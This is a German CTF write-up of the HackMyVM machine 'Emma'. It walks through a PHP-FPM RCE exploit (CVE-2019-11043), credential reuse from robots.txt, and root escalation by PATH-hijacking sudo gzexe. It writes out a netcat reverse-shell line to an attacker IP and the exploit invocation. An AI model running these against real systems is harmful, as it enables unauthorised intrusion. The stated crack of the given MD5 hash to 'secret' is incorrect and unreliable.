# Emma - HackMyVM (Hard)

![Emma.png](Emma.png)

## Übersicht

*   **VM:** Emma
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Emma)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 13. September 2022
*   **Original-Writeup:** https://alientec1908.github.io/Emma_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Hard"-Challenge war es, Root-Zugriff auf der Maschine "Emma" zu erlangen. Die Enumeration deckte einen Nginx-Webserver auf, der eine `/phpinfo.php`-Seite exponierte. Diese wurde genutzt, um eine PHP-FPM RCE-Schwachstelle (CVE-2019-11043) mittels des Tools `phuip-fpizdam` auszunutzen, was zu einer initialen Shell als `www-data` führte. Als `www-data` wurde das MySQL-Root-Passwort (`itwasonlyakiss`) in der `/robots.txt` des Webservers gefunden. In der MySQL-Datenbank (`users.users`) wurde ein MD5-Hash für den Benutzer `emma` entdeckt, der zu `secret` geknackt wurde. Nach dem SSH-Login als `emma` wurde die User-Flag gelesen. Eine `sudo`-Regel erlaubte `emma` das Ausführen von `/usr/bin/gzexe` als `root`. Durch PATH-Hijacking (Erstellen eines bösartigen `gzip`-Skripts in `/tmp` und Modifikation des `PATH`) wurde beim Ausführen von `sudo gzexe` eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `curl`
*   `gobuster`
*   `wfuzz` (Versuch, nicht erfolgreich)
*   `go` (zum Kompilieren von `phuip-fpizdam`)
*   `phuip-fpizdam` (PHP-FPM RCE Exploit)
*   `nc` (netcat)
*   `python3` (für PTY-Shell-Stabilisierung)
*   `mysql` (Client)
*   `Crackstation` (externer MD5-Cracker)
*   `ssh`
*   `sudo` (auf Zielsystem)
*   `gzexe` (als Exploit-Vektor)
*   Standard Linux-Befehle (`vi`, `stty`, `ss`, `echo`, `chmod`, `export`, `cd`, `ls`, `cat`, `id`, `who`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Emma" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.129`, Hostname `emma.vm`).
    *   `nmap`-Scan identifizierte SSH (22/tcp) und Nginx (80/tcp).
    *   `/robots.txt` auf Port 80 enthielt den String `itwasonlyakiss`.
    *   `gobuster` fand `/phpinfo.php` auf Port 80.

2.  **Initial Access (als `www-data` via PHP-FPM RCE):**
    *   Die `/phpinfo.php`-Seite wurde genutzt, um eine PHP-FPM RCE-Schwachstelle (CVE-2019-11043) mit dem Tool `phuip-fpizdam` auszunutzen.
    *   Das Tool ermittelte die notwendigen Parameter (`--qsl 1755 --pisos 30`).
    *   Der Exploit wurde mit einem Reverse-Shell-Payload ausgeführt (`./phuip-fpizdam --qsl 1755 --pisos 30 "http://emma.vm/phpinfo.php?a=[payload]"`) und etablierte eine Shell als `www-data`.

3.  **Privilege Escalation (von `www-data` zu `emma` via MySQL Credentials):**
    *   Als `www-data` wurde der lokale MySQL-Server untersucht.
    *   Das Passwort `itwasonlyakiss` (aus `robots.txt`) wurde erfolgreich für den MySQL-`root`-Login verwendet.
    *   In der Datenbank `users`, Tabelle `users`, wurde ein MD5-Hash (`5f4dcc3b5aa765d61d8327deb882cf80`) für den Benutzer `emma` gefunden.
    *   Der Hash wurde mit Crackstation.net zu `secret` geknackt.
    *   Ein SSH-Login als `emma` mit dem Passwort `secret` war erfolgreich.

4.  **Privilege Escalation (von `emma` zu `root` via `sudo gzexe` / PATH Hijacking):**
    *   Als `emma` wurde die User-Flag gelesen.
    *   `sudo -l` zeigte, dass `emma` `/usr/bin/gzexe` als `root` ohne Passwort ausführen durfte.
    *   Ein bösartiges Skript namens `gzip` wurde in `/tmp` erstellt, das eine Netcat-Reverse-Shell startete (`echo "nc -e /bin/sh [Angreifer-IP] 4444" > /tmp/gzip`).
    *   Das Skript wurde ausführbar gemacht (`chmod +x /tmp/gzip`).
    *   Der `PATH` wurde manipuliert, sodass `/tmp` Vorrang hatte (`export PATH=/tmp:$PATH`).
    *   Der Befehl `sudo /usr/bin/gzexe /beliebige/datei` (z.B. `/bin/id`) wurde ausgeführt.
    *   Dies löste das bösartige `/tmp/gzip`-Skript als `root` aus und etablierte eine Root-Shell zum Listener des Angreifers. Die Root-Flag wurde gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Information Disclosure in `robots.txt`:** Das MySQL-Root-Passwort wurde in `robots.txt` preisgegeben.
*   **PHP-FPM RCE (CVE-2019-11043):** Ausnutzung einer bekannten Schwachstelle über eine exponierte `phpinfo.php`-Seite.
*   **Speicherung von Passwörtern als MD5-Hash:** Ein MD5-Hash in der Datenbank konnte leicht geknackt werden.
*   **Passwort-Wiederverwendung / Schwache Passwörter:** Das MySQL-Root-Passwort war einfach, ebenso das Passwort für `emma`.
*   **Unsichere `sudo`-Regel (`gzexe`):** Das Erlauben von `gzexe` als Root ist anfällig für PATH-Hijacking.
*   **PATH Hijacking:** Manipulation der `PATH`-Umgebungsvariable, um ein bösartiges Skript mit erhöhten Rechten auszuführen.

## Flags

*   **User Flag (`/home/emma/user.txt`):** `youdontknowme`
*   **Root Flag (`/root/root.txt`):** `itsmeimshe`

## Tags

`HackMyVM`, `Emma`, `Hard`, `Web`, `Nginx`, `PHP-FPM`, `CVE-2019-11043`, `RCE`, `robots.txt`, `Information Disclosure`, `MySQL`, `MD5 Cracking`, `SSH`, `sudo`, `gzexe`, `PATH Hijacking`, `Privilege Escalation`, `Linux`
